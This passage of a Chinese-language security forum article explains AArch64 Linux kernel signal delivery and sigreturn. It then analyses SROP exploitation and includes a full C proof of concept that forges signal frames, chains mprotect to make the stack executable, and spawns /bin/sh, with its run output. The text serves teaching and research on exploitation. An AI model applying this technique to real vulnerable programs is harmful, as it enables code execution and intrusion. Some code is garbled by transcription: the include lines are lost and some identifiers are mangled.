  异常入口(keren_ventry/kernel_entry)会将用户态当前寄存器状态保存到此regs中,
  同时异常返回时此regs会重新赋值给用户态运行环境，即此regs的修改会导致用户态控制流等变化。
*/
static void do_signal(struct pt_regs *regs)
{
    unsigned long continue_addr = 0, restart_addr = 0;
    int retval = 0;
    struct ksignal ksig;
 
    bool syscall = in_syscall(regs);     /* 根据pt_regs->syscallno判断当前用户态是否是通过系统调用进入的异常 */
 
    /* 系统调用返回的ERESTART* 系列返回值是需要在这里处理的 */
    if (syscall) {                            /* 对于系统调用,则需要检查其返回值(R0)是否代表此系统调用要重新执行,若是则修正pc */
        continue_addr = regs->pc;
        restart_addr = continue_addr - (compat_thumb_mode(regs) ? 2 : 4);
         
        retval = regs->regs[0];                /* 获取syscall返回值,系统调用的返回值在 invoke_syscall 的最终已经放到regs->regs[0]中了 */
        forget_syscall(regs);               /* Avoid additional syscall restarting via ret_to_user. */
 
        /*
           系统调用时若返回类似 ERESTARTSYS 则都需要先为此线程设置信号, 以确保可以走到此流程
           此时需要里需要恢复进入syscall之前的x0 以供restart使用, 并同时重置pc为restart之前的那一条指令.
        */
        switch (retval) {
        case -ERESTARTNOHAND:
        case -ERESTARTSYS:
        case -ERESTARTNOINTR:
        case -ERESTART_RESTARTBLOCK:
            regs->regs[0] = regs->orig_x0;
            regs->pc = restart_addr;
            break;
        }
    }
     
    /* 从线程的pending/shared_pending队列中查找信号,对于SIG_DFL的直接处理掉,SIG_IGN的信号直接忽略,
       若发现一个信号需要执行handler则立即返回,不再处理剩余信号.
       此函数返回true则代表找到一个要执行的handler,返回false代表所有信号均处理完毕,没有需要执行的handler.
    */
    if (get_signal(&ksig)) {     
        ......
        /* 若发现一个信号需要执行信号处理函数,则调用此函数:
           * 将当前用户态上下文保存到用户态栈/用户态信号栈
           * 将用户态上下文设置为信号处理(pc=handler/sp=sp+x;lr=__kernel_rt_sigreturn ...)
        */
        handle_signal(&ksig, regs);
        return;
    }
    ......
}

```

  其中 **do_signal=>get_signal** 负责从信号队列中获取一个信号, 其定义如下:

```
/*
  此函数先从线程私有队列中查找信号,没有则从线程组共享信号队列中查找信号:
  * 若一个信号调用默认处理函数,则此函数内部会直接将其处理掉.
  * 若一个信号指定要被忽略,则此函数会直接删除并忽略此信号.
  * 若一个信号指定了handler,则此函数立即返回,不再处理其余信号.
  需要注意的是此函数会忽略当前线程block的信号(current->blocked)
*/
bool get_signal(struct ksignal *ksig)
{
    /* 线程组共用结构体 */
    struct sighand_struct *sighand = current->sighand;
    struct signal_struct *signal = current->signal;
    int signr;
 
    /* 信号处理要返回用户态,在此之前task如果有work需要做则先执行work函数 */
    if (unlikely(current->task_works))
        task_work_run();
    ......
relock:
    spin_lock_irq(&sighand->siglock);
    ......
 
    for (;;) {
        struct k_sigaction *ka;
        ......
        signr = dequeue_synchronous_signal(&ksig->info);   /* 优先处理同步信号,如 SIGTRAP */
 
        /* 从线程pending/shared_pending队列中获取一个信号并将其移出队列(dequeue), 当前线程blocked的信号会被忽略 */
        if (!signr)
            signr = dequeue_signal(current, ¤t->blocked, &ksig->info);
 
        if (!signr) break;                                   /* 没有其他信号需要处理则跳出循环 */
         
        ka = &sighand->action[signr-1];
        ......
        if (ka->sa.sa_handler == SIG_IGN)                    /* 若此信号标记为被忽略,则处理下一个信号 */
            continue;
         
        if (ka->sa.sa_handler != SIG_DFL) {                  /* 若找到了一个需要调用handler的信号,则记录信息后返回 */
            /* Run the handler.  */
            ksig->ka = *ka;
            if (ka->sa.sa_flags & SA_ONESHOT)             /* oneshot的信号需要重置为默认handler */
                ka->sa.sa_handler = SIG_DFL;
            break; 
        }
 
        /* 到这里说明此信号要调用默认的处理函数,对于默认处理函数为忽略的信号直接continue处理下一个 */
        if (sig_kernel_ignore(signr)) /* Default is nothing. */
            continue;
 
        if (sig_kernel_stop(signr)) {
                ......
        }
          
    fatal:      /* 当收到SIGKILL等信号时会走这里 */
        .......
        if (sig_kernel_coredump(signr)) {
            .......
            do_coredump(&ksig->info);
        }
        .......
        do_group_exit(ksig->info.si_signo);
    }
    spin_unlock_irq(&sighand->siglock);
out:
    ksig->sig = signr;
    ......
    return ksig->sig > 0;
}

```

  其中 **do_signal=>get_signal=>dequeue_synchronous_signal/dequeue_signal** 逻辑类似, 这里仅以 dequeue_signal 为例:

```
/* 此函数从pending/shared_pending中下链一个信号, 并检查此线程组中是否还有需要处理的信号,
  没有则清空线程的TIF_SIGPENDING. 此函数中的mask为阻塞掩码, 被阻塞的信号在查找过程中被忽略.
*/
int dequeue_signal(struct task_struct *tsk, sigset_t *mask, kernel_siginfo_t *info)
{
    bool resched_timer = false;
    int signr;
 
    /* 从pending队列下链一个信号并通过info返回,需要注意的是这里传入的mask是block掩码, 
      即信号获取时会忽略被block的信号 */
    signr = __dequeue_signal(&tsk->pending, mask, info, &resched_timer);
    if (!signr) {
        /* 如线程私有的pending队列中没有信号,则检查线程组的shared_pending队列是否有要处理信号 */
        signr = __dequeue_signal(&tsk->signal->shared_pending, mask, info, &resched_timer);
        ......
    }
 
    /* 若此线程的私有信号队列(pending)或线程组信号队列(shared_pending)中还有信号,
      则当前线程不会清空TIF_SIGPENDING,清空则代表所有信号都处理完毕 */
    recalc_sigpending();
     
    if (!signr)  return 0;
    .......
    return signr;
}

```

  **在确定信号需要执行 handler 后, do_signal=>handle_signal** 负责将 handler 函数指针设置到用户态执行上下文中，其代码如下:

```
static void handle_signal(struct ksignal *ksig, struct pt_regs *regs)
{
    sigset_t *oldset = sigmask_to_save();
    int usig = ksig->sig;
    int ret;
    ......
 
    /*
       在用户栈上为信号分配栈帧,其中保留用户态当前上下文(pt_regs); 同时设置新的用户态上下文,包括
        pc指向信号处理函数, sp指向新栈顶,信号处理函数返回地址设置为__kernel_rt_sigreturn等.
       此函数设置后, 当此异常返回到用户态时会直接跳转到信号处理函数.
    */
    ret = setup_rt_frame(usig, ksig, oldset, regs);
 
    ret |= !valid_user_regs(®s->user_regs, current);       /* 检查单步调试和pstate等状态状态是否正确 */
   
    .......
}

```

  其中 **setup_rt_frame** 负责在用户态栈上保存异常前的执行环境，并设置用户态返回后直接跳转到信号处理函数:

```
/*
   内核会在用户态栈帧中为每个信号处理函数构建一个栈帧, 此栈帧由一个 rt_sigframe + frame_record结构体组成,其中:
   * rt_sigframe结构体负责记录当前信号信息和信号发生时用户态的上下文信息
   * frame_record用来支持栈回溯,其fp/lr分别来自rt_sigframe.uc.uc_mcontext.regs[29]/regs[30]
  ps: 对于用户态,其可以设置使用当前函数栈作为信号处理的栈帧，也可以单独为信号创建一个信号栈帧.
*/
struct rt_sigframe {
    struct siginfo info;  /* 记录当前信号处理函数处理的信号信息 */
    struct ucontext uc;       /* 记录当前信号处理函数执行前的用户态上下文 */
};
 
struct frame_record {
    u64 fp;
    u64 lr;
}; 
 
/*
   此函数在用户栈上为信号分配栈帧,其中保留用户态当前上下文(pt_regs); 同时设置新的用户态上下文,包括
  pc指向信号处理函数, sp指向新栈顶,信号处理函数返回地址设置为__kernel_rt_sigreturn等.
*/
static int setup_rt_frame(int usig, struct ksignal *ksig, sigset_t *set, struct pt_regs *regs)
{
    struct rt_sigframe_user_layout user;
    struct rt_sigframe __user *frame;
    int err = 0;
    ......
 
    /*
       在当前用户栈或用户态专用信号栈上计算下一个信号栈帧需要的空间,此空间包含一个 rt_sigframe 
      和一个 frame_record结构体, 二者的(用户态)地址分别记录在user->sigframe/next_frame中, 此
      时regs->sp(即用户态上下文)尚未被修改.
       为了便于理解，后面仅以信号直接使用用户栈的情况为例; frame_record只用于栈回溯,同样也忽略;
    */
    if (get_sigframe(&user, ksig, regs))
        return 1;
 
    frame = user.sigframe;         /* 获取用户态刚分配的的rt_sigframe结构体指针 */
    ......
 
    /* 将信号发生前用户态上下文(pt_regs)记录到用户态栈 user->sigframe.uc.uc_mcontext中 */
    err |= setup_sigframe(&user, regs, set);
     
    if (err == 0) {
        /* 设置新的pt_regs,对pt_regs的修改在返回用户态后会直接使控制流转移到信号处理函数:
           * 用户态pc(regs->pc) 指向用户态handler
           * 函数返回地址(regs->regs[30]) 指向vdso __kernel_rt_sigreturn
           * 设置正确的用户态栈帧
           用户态信号处理函数ret返回后会跳转到 __kernel_rt_sigreturn 继续执行
        */
        setup_return(regs, &ksig->ka, &user, usig);
         
        /* 如果需要siginfo则复制回用户态,体现为信号处理函数的参数0/1 */
        if (ksig->ka.sa.sa_flags & SA_SIGINFO) {        
            err |= copy_siginfo_to_user(&frame->info, &ksig->info);
            regs->regs[1] = (unsigned long)&frame->info;
            regs->regs[2] = (unsigned long)&frame->uc;
        }
    }
    return err;
}

```

4.3 中断处理函数执行完毕后恢复用户态上下文
-----------------------

   由上可知, 当内核发现一个信号需要执行信号处理函数时, 会保存当前用户态上下文并重置为信号处理的上下文。

   当前用户态上下文是保存在用户态栈中**, 信号处理函数执行完毕后需要恢复到原有用户态上下文执行**, 这一步上下文恢复操作是通过 sys_rt_sigreturn 系统调用完成的, 在设置信号处理上下文时 setup_rt_frame 会设置其返回地址为__kernel_rt_sigreturn, 这样信**号处理函数执行完毕后即可以无感知的通过正常函数返回 (ret) 跳转并执行 sys_rt_sigreturn 系统调用**，sys_rt_sigreturn 定义如下:

```
SYSCALL_DEFINE0(rt_sigreturn)
{
    struct pt_regs *regs = current_pt_regs();           /* 获取用户态当前上下文 */
    struct rt_sigframe __user *frame;
    ......
    frame = (struct rt_sigframe __user *)regs->sp;      /* 获取用户态栈帧中的 rt_sigframe指针 */
 
    if (!access_ok(frame, sizeof (*frame)))              /* 栈帧只能来自用户态 */
        goto badframe;
 
    /* 从用户态栈帧恢复之前的上下文,在恢复前要检查可能导致提权的pstate等值 */
    if (restore_sigframe(regs, frame))                   
        goto badframe;
    .......
 
    /* regs[0]是系统调用前用户态的R0, 若此调用来自用户态信号处理函数
      (最后的ret),则R0记录的是信号处理函数的返回值 */
    return regs->regs[0];                              
 
badframe:
    arm64_notify_segfault(regs->sp);
    return 0;
}

```

  其中 restore_sigframe 用来从用户态栈帧恢复原本的用户态上下文, 其定义如下:

```
static int restore_sigframe(struct pt_regs *regs, struct rt_sigframe __user *sf)
{
    sigset_t set;
    int i, err;
    struct user_ctxs user;
 
    /* 从用户态栈帧复制并设置新的block掩码 */
    err = __copy_from_user(&set, &sf->uc.uc_sigmask, sizeof(set));
    if (err == 0)
        set_current_blocked(&set);
 
    /* 从用户态栈帧恢复原有的用户态上下文 */
    for (i = 0; i < 31; i++)
        __get_user_error(regs->regs[i], &sf->uc.uc_mcontext.regs[i], err);
     
    __get_user_error(regs->sp, &sf->uc.uc_mcontext.sp, err);
    __get_user_error(regs->pc, &sf->uc.uc_mcontext.pc, err);
     
    /* pstate同样来自用户态,但在此函数末尾要经过充分检查 */
    __get_user_error(regs->pstate, &sf->uc.uc_mcontext.pstate, err);
 
    forget_syscall(regs);           /* 确保sys_rt_sigreturn返回任何值都不会导致系统调用重新执行  */
 
     /* 检查用户态参数的安全性, 如pstate最终会被设置到cpsr中, 如果其设置有错误可能会导致用户态
      异常级别被提升,故这里需要进行充分的检查. */
    err |= !valid_user_regs(®s->user_regs, current);
    ......
    return err;                        /* 当前用户态寄存器已经均回复到信号处理函数发生前的状态了, 此时返回用户态 */
}

```

4.4 内核线程信号处理举例
--------------

这里以内核线程 jffs2_garbage_collect_thread 为例:

```
static int jffs2_garbage_collect_thread(void *_c)
{
    .......
    siginitset(&hupmask, sigmask(SIGHUP));
    allow_signal(SIGKILL);                  /* 允许用户态发送 SIGKILL/SIGSTOP/SIGHUP 信号 */
    allow_signal(SIGSTOP);
    allow_signal(SIGHUP);
    .......
    for (;;) {                                /* 处理收到的用户态发送的*/
        .......
        while (signal_pending(current) || freezing(current)) {
            .......
            signr = kernel_dequeue_signal();
            switch(signr) {
            case SIGSTOP:
                jffs2_dbg(1, "%s(): SIGSTOP received\n",  __func__);
                kernel_signal_stop();
                break;
            case SIGKILL:
                jffs2_dbg(1, "%s(): SIGKILL received\n", __func__);
                goto die;
            case SIGHUP:
                jffs2_dbg(1, "%s(): SIGHUP received\n", _func__);
                break;
            default:
                jffs2_dbg(1, "%s(): signal %ld received\n",
                      __func__, signr);
            }
        }
    .......
}

```

五、SROP 原理与安全性分析
===============

  在 DEP(Data Execution Prevention) 普遍部署之后, 控制流劫持后跳转到数据执行 shellcode(如栈溢出后跳转到栈执行) 的方式就基本无法使用了。攻击者通常只能通过 ret2xxx(如 ret2libc/ROP/JOP) 的方式执行其所需要的代码逻辑，但构建这样的执行序列通常并不容易，以 ROP(Return Orientend Programming) 为例，攻击者通常需要满足以下前提:

**1) 攻击者可以在目标应用中收集到足够多的 gadgets 且可以确定其运行时地址**

**2) 攻击者可以在程序运行时将适合的数据布局到栈中**

**3) 攻击者可以利用漏洞劫持控制流并跳转到第一个 gadget**

对于 1) 来说能否满足条件:

*   首先取决于目标应用中是否存在满足攻击者需要的 gadget
*   其次二进制及其运行库的版本对 gadget 的影响极大, 不同版本的适配需要大量的工作，exp 的通用性也难以保证
*   一些安全特性也会增加 gadget 获取难度，如:

*   gadget 消除技术可能导致无法获取所需的 gadgets
*   ASLR 随机化会使获取 gadgets 的运行时地址更加困难

**而 SROP(Sigreturn Orientend Programming)[1,2] 的出现则可以解决 1) 中遇到的绝大多数问题**:

*   最理想情况下, SROP 只需要一个不需要参数的 sigreturn gadget 既可以完成 execve。
*   sigreturn 在大多数系统 (Linux/Android/BSD/Max OS/...) 运行时的大多数可执行文件中几乎都存在，这会极大减少适配工作，exp 也可以更加通用。
*   安全特性对 SROP 没有保护或较容易绕过:

*   ASLR 最多只需要一个 infoleak 即可获取 sigreturn 地址，在某些系统中此地址甚至是固定的。
*   sigreturn 是信号处理必须的系统调用，从 Unix 开始就一直存在超过 40 年, 此 gadget 在二进制中难以被消除。

以 AArch64 为例, 由前面可知在信号处理的过程中:

1.  内核不负责保存信号处理函数执行前的用户态上下文，这些信息会保存在用户态栈帧中
2.  内核返回用户态执行信号处理之前会设置信号处理函数的返回地址 (x30) 指向 [vdso] 中的__kernel_rt_sigreturn 函数
3.  信号处理函数执行完毕后通过 ret 指令跳转到__kernel_rt_sigreturn.
4.  __kernel_rt_sigreturn 通过 svc 指令调用系统调用 sys_[rt_]sigreturn, 从用户态栈中恢复信号前的用户态上下文，最终返回到用户态的此上下文继续执行, 此函数定义如下:

```
##内核代码
##./arch/arm64/kernel/vdso/sigreturn.S
SYM_CODE_START(__kernel_rt_sigreturn)
        mov     x8, #__NR_rt_sigreturn
        svc     #0  
SYM_CODE_END(__kernel_rt_sigreturn
 
 
## 用户态运行时的vdso
00400000-00479000 r-xp 00000000 00:02 5                                  /main
00489000-0048a000 r--p 00079000 00:02 5                                  /main
0048a000-0048c000 rw-p 0007a000 00:02 5                                  /main
0048c000-0048f000 rw-p 00000000 00:00 0 
28044000-28066000 rw-p 00000000 00:00 0                                  [heap]
ffffa0c63000-ffffa0c65000 r--p 00000000 00:00 0                          [vvar]
ffffa0c65000-ffffa0c66000 r-xp 00000000 00:00 0                          [vdso]
fffff31e5000-fffff3206000 rw-p 00000000 00:00 0                          [stack]
 
__kernel_rt_sigreturn:
   0xffffa0c6585c:        mov     x8, #0x8b           // #139  __NR_rt_sigreturn
   0xffffa0c65860:        svc     #0x0                            //d4000001

```

这也就意味着只要**攻击者控制了当前栈帧并执行一个 sys_rt_sigreturn 后，既可以控制当前用户态的所有通用硬件寄存器，**包括:

*   R0-R29: 即攻击者可以控制所有参数
*   R30: 即攻击者可以控制后续的函数返回地址
*   PC: 即攻击者可以控制 sys_rt_sigreturn 返回的地址
*   SP: 即攻击者可以控制返回后的栈帧

  简单说 **sigreturn 实际上就是一个能力极其强大的 gadget，其可以完成任何参数设置，控制流转移，返回地址设置，堆栈指针修改操作**。且由于 sigreturn 中本身就存在一条 svc 指令，攻击者同时还可以复用此 gadget 执行**一次** execve 来获取本地 shell。利用 SROP 执行 execve 的流程如下图:

![](https://bbs.pediy.com/upload/attach/202201/490870_DCKHHZWXWTAYKXS.jpg)

  但需要注意的是**如果使用 SROP 来 chain 多个系统调用时，则还需一个额外的 syscall& ret; gadget,** 这是因为 __kernel_rt_sigreturn 中虽然有一个可用的 svc 指令，但其后面通常没有 ret 指令，因此此 svc 指令其不能用来链接 gadget chain。 如当攻击者需要执行如 mprotect + shellcode 时, 则需要找到一个 svc 0; ret; 指令序列来确保 mprotect 系统调用执行完毕后会有一条 ret 指令可以返回到 sigreturn 设置的 lr 寄存器位置。以下代码可用来简单测试 SROP 和基于 SROP 的 syscall chain:

```
#include  #include  #include  #include  #include  #include  #include  #include  #include  #include  /* rt_sigreturn check if sp is 16 byte aligned */
#define _ROUND_UP(x,n) (((x)+(n)-1u) & ~((n)-1u))
#define ROUND_UP(x) _ROUND_UP(x,16LL)
#define ROUND_DOWN(x) ((x) & (~((16LL)-1)))
 
struct sigframe
{
    siginfo_t info;
    struct ucontext uc;
};
 
struct sigframe g_backup; /* used to stuff new sigframe */
void * sigreturn_addr;        /* address of sigreturn */
void * syscall_ret_addr;  /* address of a gadget has syscall with ret insn to chain next directive */
void syscall_ret(void)
{
    asm("svc 0\n\t" :::); /* simpliy emulate a syscall with ret*/
}
 
void action(int signo, siginfo_t *info, void *ctx)
{
    /* check struct size match */
    struct sigframe *sf = (void *)info;
    if(&sf->uc != ctx) {
        printf("[-] sigframe struct size mismatch\n");
        exit(0);
    }
 
    sigreturn_addr = __builtin_return_address(0);     /* get sigreturn address */
    g_backup.info = *info;
    g_backup.uc = *(struct ucontext *)ctx;
 
    return;
}
 
void get_sys_from_signal(void)
{
    struct sigaction act;
    sigset_t set, oldset;
 
    act.sa_sigaction = action;
    act.sa_flags = SA_SIGINFO;
    sigemptyset(&act.sa_mask);
 
    sigemptyset(&set);
    sigemptyset(&oldset);
    sigaddset(&set, SIGUSR1);
 
    sigaction(SIGUSR1, &act, NULL);
 
    sigprocmask(SIG_SETMASK, &set, &oldset);
 
    kill(getpid(), SIGUSR1);
 
    /* signal handler will executed before this sycall return */
    sigprocmask(SIG_SETMASK, &oldset, NULL);
}
 
void env_init(void)
{
    /* get addr of sigreturn & syscall insns. */
    get_sys_from_signal();
 
    syscall_ret_addr = &syscall_ret;
 
    if(!sigreturn_addr) {
        printf("[-] sigreturn_addr not set.\n");
        return 0;
    }
 
    printf("[+] sigreturn addr:%p, syscall_ret addr:%p\n", \
        sigreturn_addr, syscall_ret_addr);
}
 
void show_maps(void)
{
    int ret;
    char buf[0x100];
    int fd = open("/proc/self/maps", O_RDONLY);
     
    do {
        memset(buf, 0, sizeof(buf));
        ret = read(fd, buf, sizeof(buf));
        write(1, &buf, ret);
    } while(ret);
 
    write(1, "\n", 1);
    close(fd);
}
 
/*
  This function is used to simulate the vulnerability,
  (for simplicity) it directly switches the current sp
*/
void vul_trigger(unsigned long * new_sp)
{
    asm("mov sp, %0\n\t"
    :
    :"r"(new_sp)
    :);
 
    /* ret address should be pop from epilogue in real exp,
       for stability in the test case, we just change it manurally
    */
    register volatile unsigned long lr asm("x30") = sigreturn_addr;
    asm("ret\n\t");
}
 
void stuff_sigframe3(struct sigframe * sf, int scno,
    void * pc, void * lr, void * sp,
    void * arg0, void * arg1, void *arg2)
{
    struct ucontext * uc = &sf->uc;
 
    memset(sf, 0, sizeof(struct sigframe));
     
    uc->uc_mcontext = g_backup.uc.uc_mcontext; /* __reserved copies from g_backup */
 
    uc->uc_mcontext.regs[30] = lr;
    uc->uc_mcontext.pc = pc;
    uc->uc_mcontext.sp = sp;
    uc->uc_mcontext.regs[8] = scno;
    uc->uc_mcontext.regs[0] = arg0;
    uc->uc_mcontext.regs[1] = arg1;
    uc->uc_mcontext.regs[2] = arg2;
}
 
void sigframe_push_mprotect(struct sigframe * frame, void * addr,
    unsigned long size, int prot, void * pc, void * lr, void * sp)
{
    printf("[+] add to sigframe(%016p): mprotect(%p, %x, %x); \n", frame, addr, size, prot);
    stuff_sigframe3(frame, SYS_mprotect, pc, lr, sp, addr, size, prot);
}
 
void sigframe_push_exec(struct sigframe * frame, char * name,
    void * argv, void * envp, void * pc, void * sp, void * lr)
{
    printf("[+] add to sigframe(%016p): execve(%s, %p, %p); \n", frame, name, argv, envp);
    stuff_sigframe3(frame, SYS_execve, pc, lr, sp, name, argv, envp);
}
 
void test_mprotect(void * sigret_stack, void * addr, int size, int prot)
{
    unsigned long ret = __builtin_return_address(0);
    unsigned long cfa = __builtin_frame_address(1);
 
    /* set a sigframe for sigreturn to call mprotect, and set paramters to let 
       mprot return to the write caller (current lr), with right sp (cfa). */
    sigframe_push_mprotect(sigret_stack, addr, size, prot, syscall_ret_addr, ret, cfa);
 
    vul_trigger(sigret_stack);
}
 
void test_mprotect_wrapper(void)
{
 
    /* For qemu-user, this struct can't put in funcion like test_mprotect_wrapper,
      otherwise the vdso insn will lost (should be a bug of qemu) */
    struct sigframe frame __attribute__((aligned(0x10)));
 
    void * sigret_stack = &frame;
 
    /* set a 'ret' insn in no executable stack for test if mprotect is succeed. */
    unsigned long __attribute__((aligned(0x1000))) data = 0xd65f03c0; 
 
    test_mprotect(sigret_stack, &data, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC);
 
    /* stack is RWX for now, function p only execute a single 'ret' insn and can
       return normally. It will cause a crash if mprotect not work. */
    void (*p)(void) = &data;
    p();
}
 
struct sigframe_for_exec
{
    struct sigframe frame __attribute__((aligned(0x10)));
    void * argv[2] __attribute__((aligned(0x10)));
    char name[0];
};
 
void * test_exec(char * name, int shot)
{
    unsigned long ret = __builtin_return_address(0);
    unsigned long cfa = __builtin_frame_address(1);
    void * arg0, * arg1 = NULL, * arg2 = NULL;
    /* 
       for busybox, we need to give a argv {"/bin/sh", NULL};
       for real shell it can be zero;
     */
    int strlength = ROUND_UP(strlen(name) + 1);
    int size = ROUND_UP(sizeof(struct sigframe_for_exec) + strlength);
 
    struct sigframe_for_exec * sf_exec = malloc(size);
    memset(sf_exec, 0, size);
 
    arg0 = sf_exec->name;
    memcpy(arg0, name, sizeof(name));
 
    /* --------- no need for real shell ------ */
    sf_exec->argv[0] = arg0;
    arg1 = sf_exec->argv;
    /* ----------------------------------- */
 
    sigframe_push_exec(&sf_exec->frame, arg0, arg1, arg2, sigreturn_addr + 4, ret, cfa);
 
    if(shot)
        vul_trigger(sf_exec);
    else
        return sf_exec;
}
 
void test_mprotect_exec()
{
    /* For qemu-user, this struct can't put in funcion like test_mprotect_wrapper,
      otherwise the vdso insn will lost (should be a bug of qemu) */
    struct sigframe frame __attribute__((aligned(0x10)));
 
    void * next_sigframe = &frame;
 
    void * prev_sigframe = test_exec("/bin/sh", 0);
 
    unsigned long ret = __builtin_return_address(0);
    unsigned long cfa = __builtin_frame_address(1);
 
    /*
       // for exec mprotect
       1) set stack executable: ret & 0xfff, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC
           2) call sigreturn, set pc = syscall_ret_addr, which can use a 'svc' insn to execute mprotect
       3) next insn of 'svc' is a 'ret', 'ret' will redirect pc to sigreturn_addr (address of sigreturn)
       // for exec execve
       4) call sigreturn again, just set pc = 'sigreturn + 4', use that 'svc' to execute execve syscall
          execve will not return, so 'ret' insn is not needed in this case.
       pc = syscall_ret_addr is used in step 2) to call a mprotect and is next insn used to control the control flow.
       lr = sigreturn_addr is used in step 3) to chain mprotect with another sigreturn
       sp = prev_sigframe is used in step 4) as paramter of sigreturn to redirect control to next 'svc', aka execve.
    */
    sigframe_push_mprotect(next_sigframe, \
        ret & ~(0xfff), 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, \
        syscall_ret_addr, sigreturn_addr, prev_sigframe);
 
    vul_trigger(next_sigframe);
}
 
int main()
{
    show_maps();
 
    env_init();
 
    test_mprotect_wrapper();                /* mprotect and return normally */
 
    printf("[+] test mprotect RWX succeed!\n");
 
    //test_exec("/bin/sh", 1);         /* execve only */
 
    test_mprotect_exec();                     /* chain mprotext with a execve */
 
    return 0;
} 
```

  test case 输出如下:

```
Please press Enter to activate this console.  # 
# ./main 
00400000-00479000 r-xp 00000000 00:02 5                                  /main
00489000-0048a000 r--p 00079000 00:02 5                                  /main
0048a000-0048c000 rw-p 0007a000 00:02 5                                  /main
0048c000-0048f000 rw-p 00000000 00:00 0 
2dedf000-2df01000 rw-p 00000000 00:00 0                                  [heap]
ffffbaf5a000-ffffbaf5c000 r--p 00000000 00:00 0                          [vvar]
ffffbaf5c000-ffffbaf5d000 r-xp 00000000 00:00 0                          [vdso]
ffffccde0000-ffffcce01000 rw-p 00000000 00:00 0                          [stack]
 
[+] sigreturn addr:0xffffbaf5c85c, syscall_ret addr:0x4006e4
[+] add to sigframe(0x00ffffccdff100): mprotect(0xffffccdff000, 1000, 7); 
[+][kernel] mprotect called with addr:0000ffffccdff000, len:1000, prot:7                  ## 内核日志，mprotect调用时打印信息
[+] test mprotect RWX succeed!
[+] add to sigframe(0x0000002dee13d0): execve(/bin/sh, 0x2dee2620, (nil)); 
[+] add to sigframe(0x00ffffccdff0f0): mprotect(0x400000, 1000, 7); 
[+][kernel] mprotect called with addr:0000000000400000, len:1000, prot:7                  ## 内核日志，mprotect调用时打印信息
# exit                                                                                     ## 两个exit退出, /bin/sh执行成功
# exit
Please press Enter to activate this console.

```

PS:

vdso 的地址是通过 mmap 分配出来的，故用户态 ASLR 可以对攻击者增加一个 infoleak 的难度, randomize_va_space >=1 时用户态进程开启 VDSO(mmap) 随机化 [4]:

```
/ # cat /proc/self/maps|grep vdso
ffffaf823000-ffffaf824000 r-xp 00000000 00:00 0                          [vdso]
/ # cat /proc/self/maps|grep vdso
ffffbb68a000-ffffbb68b000 r-xp 00000000 00:00 0                          [vdso]
 
/ # echo 0 > /proc/sys/kernel/randomize_va_space
/ # cat /proc/self/maps|grep vdso
fffff7fff000-fffff8000000 r-xp 00000000 00:00 0                          [vdso]
/ # cat /proc/self/maps|grep vdso
fffff7fff000-fffff8000000 r-xp 00000000 00:00 0                          [vdso]

```

 参考资料:

[0] 《Linux/Unix 系统编程手册》

[1] [Framing Signals -- A Return to Portable Shellcode](http://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf "Framing Signals -- A Return to Portable Shellcode")

[2] [Framing Signals -- A Return to Portable Shellcode(slides)](https://tc.gtisc.gatech.edu/bss/2014/r/srop-slides.pdf)

[3] [SROP_「二进制安全 pwn 基础」 - 网安](https://www.wangan.com/docs/1081 "SROP_「二进制安全pwn基础」 - 网安")

[4] [https://docs.oracle.com/cd/E37670_01/E36387/html/ol_aslr_sec.html](https://docs.oracle.com/cd/E37670_01/E36387/html/ol_aslr_sec.html)

[【看雪培训】目录重大更新！《安卓高级研修班》2022 年春季班开始招生！](https://bbs.pediy.com/thread-271992.htm)

最后于 2022-2-19 15:34 被 ashimida 编辑 ，原因：

[#漏洞利用](forum-150-1-154.htm) [#Linux](forum-150-1-161.htm) [#Andorid](forum-150-1-162.htm)